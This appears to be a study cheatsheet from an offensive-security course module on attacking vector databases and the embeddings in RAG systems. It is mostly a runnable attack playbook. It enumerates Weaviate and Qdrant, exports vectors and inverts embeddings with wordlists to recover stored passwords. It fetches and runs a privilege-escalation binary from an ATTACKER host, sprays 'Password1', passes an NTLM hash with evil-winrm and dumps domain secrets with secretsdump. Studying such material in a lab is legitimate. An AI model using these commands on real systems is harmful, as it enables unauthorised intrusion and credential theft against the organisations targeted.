# Module 06 Cheatsheet — Attacking Embeddings

## Key Commands

```bash
# Enumerate Weaviate
curl -s http://TARGET:8080/v1/schema | python3 -m json.tool
curl -s http://TARGET:8081/v1/meta | python3 -m json.tool | head -20

# Enumerate Qdrant
curl -s http://TARGET:6333/
curl -s http://TARGET:6333/collections | python3 -m json.tool

# Find cached model on target
find / -type d -name "*MiniLM*" 2>/dev/null
find /root/.cache/huggingface/hub/ -type d -maxdepth 2 2>/dev/null

# Check dimension + normalization
python3 -c "
import numpy as np
e=np.load('embeddings.npy')
print(f'Shape: {e.shape}')
print(f'Norm: {np.linalg.norm(e[0]):.4f}')
print(f'Normalized: {np.allclose(np.linalg.norm(e,axis=1),1.0,atol=0.02)}')
"

# Export Weaviate vectors (Python)
python3 -c "
import weaviate,json
c=weaviate.connect_to_local(host='localhost',port=8081,grpc_port=50051)
r=c.collections.get('PasswordResetPolicy').query.fetch_objects(limit=100,include_vector=True)
json.dump([{'p':dict(o.properties),'v':o.vector['default']} for o in r.objects if o.vector],open('/tmp/vecs.json','w'))
print(len(r.objects),'objects exported'); c.close()
"

# Full triage pipeline
python3 chunk_triage_pipe.py embeddings.npy
python3 chunk_triage_pipe.py embeddings.npy --stages density,pw  # faster, no inversion
python3 chunk_triage_pipe.py embeddings.npy --company megacorpone --top 20 -o pipe.json

# Direct inversion (template method)
python3 inversion_attack.py  # uses local model + wordlist

# Template-bank inversion (emb_fin)
python3 generate_templates.py embeddings.npy -o templates.json --count 500000
wget -O passwords.txt https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt
python3 emb_fin.py embeddings.npy --chunk 0 \
  --templates templates.json --wordlist passwords.txt \
  --slots PASSWORD --default-URL https://login.TARGET.ai

# Inference probing (model fingerprint via RAG)
python3 inference_probe.py export/embeddings.npy --url http://TARGET:80 --deep

# PDF extraction after privesc
pdftotext /root/rag_service/documents/MC1_password_reset.pdf

# Pack2TheRoot privesc (CVE-2026-41651 - Ubuntu PackageKit < 1.2.8-2ubuntu1.5)
wget http://ATTACKER/pack2theroot -O /tmp/p2r && chmod +x /tmp/p2r && /tmp/p2r

# Capstone pivot chain
nxc smb TARGET -u ts_svc -p Password1
xfreerdp /v:TARGET /u:ts_svc /p:Password1 /d:DOMAIN /cert:ignore
ssh -i id_rsa ts_svc@UBUNTU_TARGET

# Domain takeover after SAM dump
evil-winrm -i DC01 -u Administrator -H 4309f10ed11d9a6c42b2ed50e8689f7c
secretsdump.py DOMAIN/Administrator@DC01 -hashes ':HASH' -outputfile domain_dump
```

## Dimension → Model Map

| Dim  | Likely Model |
|------|-------------|
| 384  | all-MiniLM-L6-v2, all-MiniLM-L12-v2 |
| 768  | all-mpnet-base-v2, BAAI/bge-base-en |
| 1024 | BAAI/bge-large-en-v1.5 |
| 1536 | text-embedding-ada-002 (OpenAI) |

## Inversion Strategy Priority

1. **Template-based** > Direct encoding (always use `"The default password after resetting is {X}"` style)
2. **emb_fin.py** for multi-slot text (URL + password in same chunk)
3. **LLM-assisted** (`--recon-mode llm`) when wordlist fails
4. **Chunk triage first** — don't invert everything, triage to top 10

## chunk_triage_pipe.py Stages

```
DENSITY (all chunks → top 50):  isolation score + probe relevance
PW      (50 → top 20):          contrastive pos/neg probes + cluster norm
RECON   (20 → display):         seed-bank inversion + credential scoring
FUSION: Weighted RRF (density:1.0, pw:1.5, recon:2.0)
```

## Attack Flow

1. Nmap → find Weaviate (8080/8081) or Qdrant (6333)
2. `curl /schema` or `/collections` — enumerate target collections
3. Export vectors → `embeddings.npy`
4. Check dim + norm → identify model family
5. `find / -name "*MiniLM*"` → confirm exact model on target
6. Run `chunk_triage_pipe.py` → identify top-N credential chunks
7. Run inversion (`inversion_attack.py` or `emb_fin.py`) → recover text
8. Optionally: PrivEsc → read source PDF directly

## ⚠️ Weak Areas [PRIORITISE]

- Weaviate v3 vs v4 Python client API differences
- Template strategy vs direct encoding — always favour templates
- chunk_triage_pipe.py fusion weights and what each stage does
- Offline inversion setup (TRANSFORMERS_OFFLINE=1, model path)

## Remember

- Weaviate default ports: 8080 (HTTP), 8081 (alt), 50051 (gRPC)
- Qdrant default ports: 6333 (HTTP REST), 6334 (gRPC)
- Normalization check: `np.allclose(norms, 1.0, atol=0.02)` → normalized = cosine similarity
- ALWAYS use template encoding, not direct password encoding for chunk inversion
- After Pack2TheRoot → check `/root/rag_service/documents/` for target PDF
